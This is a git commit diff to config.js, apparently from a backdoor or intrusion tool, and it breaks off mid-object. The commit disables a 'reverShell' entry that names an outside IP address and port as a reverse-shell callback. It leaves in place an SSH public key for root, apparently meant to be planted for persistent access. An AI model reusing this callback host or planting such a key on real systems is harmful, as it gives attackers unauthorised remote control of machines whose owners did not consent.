a75437078df45dc4e96d0fe7be8f9df45b4ae5b1
0x101 <0x101@google.local>
2019-06-19 23:58:30 +0800

    fix

--- config.js
+++ config.js
@@ -1,5 +1,5 @@
 module.exports = {
-	reverShell:{ip:"162.219.126.11", port:80},
+	reverShell:null,//{ip:"162.219.126.11", port:80},
 	// ssh-keygen
 	xKeys:"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001",
 	noWwwBind:
